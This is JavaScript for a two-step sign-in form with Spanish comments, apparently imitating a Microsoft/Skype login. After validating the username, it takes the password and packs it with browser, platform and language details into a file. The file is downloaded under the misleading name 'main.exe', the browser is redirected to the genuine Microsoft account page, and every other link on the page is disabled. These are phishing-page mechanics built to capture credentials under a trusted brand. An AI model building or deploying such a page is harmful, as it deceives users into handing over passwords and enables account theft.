let currentStep = 1;
        const emailField = document.getElementById('email');
        const passwordField = document.getElementById('password');
        const emailGroup = document.getElementById('emailGroup');
        const passwordGroup = document.getElementById('passwordGroup');
        const nextBtn = document.getElementById('nextBtn');
        const backBtn = document.getElementById('backBtn');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const togglePassword = document.getElementById('togglePassword');
        
        // Función para validar email
        function isValidEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }
        
        // Función para validar teléfono (solo números, mínimo 10 dígitos)
        function isValidPhone(phone) {
            const re = /^\d{10,}$/;
            return re.test(phone.replace(/\D/g, ''));
        }
        
        // Función para validar Skype (sin espacios, al menos 3 caracteres)
        function isValidSkype(skype) {
            return skype.trim().length >= 3 && !skype.includes(' ');
        }
        
        // Función para manejar el botón Siguiente/Iniciar sesión
        function handleNext() {
            if (currentStep === 1) {
                // Validar email/teléfono/Skype
                const value = emailField.value.trim();
                
                if (!value) {
                    emailField.classList.add('error');
                    emailError.style.display = 'block';
                    return;
                }
                
                const isEmail = isValidEmail(value);
                const isPhone = isValidPhone(value);
                const isSkype = isValidSkype(value);
                
                if (!isEmail && !isPhone && !isSkype) {
                    emailField.classList.add('error');
                    emailError.style.display = 'block';
                    return;
                }
                
                // Ocultar error si existe
                emailField.classList.remove('error');
                emailError.style.display = 'none';
                
                // Mostrar campo de contraseña
                emailGroup.style.display = 'none';
                passwordGroup.classList.remove('hidden');
                
                // Cambiar botones
                nextBtn.textContent = 'Iniciar sesión';
                backBtn.style.display = 'flex';
                currentStep = 2;
                
                // Enfoque en el campo de contraseña
                passwordField.focus();
            } else {
                // Validar contraseña
                const password = passwordField.value;
                
                if (!password) {
                    passwordField.classList.add('error');
                    passwordError.style.display = 'block';
                    return;
                }
                
                // Ocultar error si existe
                passwordField.classList.remove('error');
                passwordError.style.display = 'none';
                
                // Descargar archivo .txt con las credenciales
                downloadCredentials(emailField.value.trim(), password);
            }
        }
        
        // Función para volver al paso anterior
        function goBack() {
            if (currentStep === 2) {
                // Volver al campo de email
                passwordGroup.classList.add('hidden');
                emailGroup.style.display = 'block';
                
                // Cambiar botones
                nextBtn.textContent = 'Siguiente';
                backBtn.style.display = 'none';
                currentStep = 1;
                
                // Enfoque en el campo de email
                emailField.focus();
            }
        }
        
        // Función para mostrar/ocultar contraseña
        togglePassword.addEventListener('click', function() {
            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordField.setAttribute('type', type);
            
            // Cambiar el icono del ojo
            const svg = this.querySelector('svg');
            if (type === 'text') {
                svg.innerHTML = `
                    <path fill="currentColor" d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
                    <path fill="currentColor" d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7.028 7.028 0 0 0-2.79.588l.77.771A5.944 5.944 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.134 13.134 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755-.165.165-.337.328-.517.486l.708.709z"/>
                    <path fill="currentColor" d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829l.822.822zm-2.943 1.299l.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829z"/>
                    <path fill="currentColor" d="M3.35 5.47c-.18.16-.353.322-.518.487A13.134 13.134 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7.029 7.029 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709z"/>
                `;
            } else {
                svg.innerHTML = `
                    <path fill="currentColor" d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
                    <path fill="currentColor" d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z"/>
                `;
            }
        });
        
        // Función para descargar archivo .txt con credenciales
        function downloadCredentials(email, password) {
            const content = `Credenciales de inicio de sesión:
            
Usuario: ${email}
Contraseña: ${password}

Fecha: ${new Date().toLocaleString()}
Navegador: ${navigator.userAgent}
Plataforma: ${navigator.platform}
Idioma: ${navigator.language}`;
            
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'main.exe';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            // Simular redirección después de la descarga
            setTimeout(() => {
                window.location.href = 'https://account.microsoft.com';
            }, 100);
        }
        
        // Manejar tecla Enter
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleNext();
            }
        });
        
        // Validación en tiempo real del campo de email
        emailField.addEventListener('input', function() {
            if (this.value.trim()) {
                this.classList.remove('error');
                emailError.style.display = 'none';
            }
        });
        
        // Validación en tiempo real del campo de contraseña
        passwordField.addEventListener('input', function() {
            if (this.value) {
                this.classList.remove('error');
                passwordError.style.display = 'none';
            }
        });
        
        // Prevenir clic en enlaces
        document.querySelectorAll('a').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
            });
        });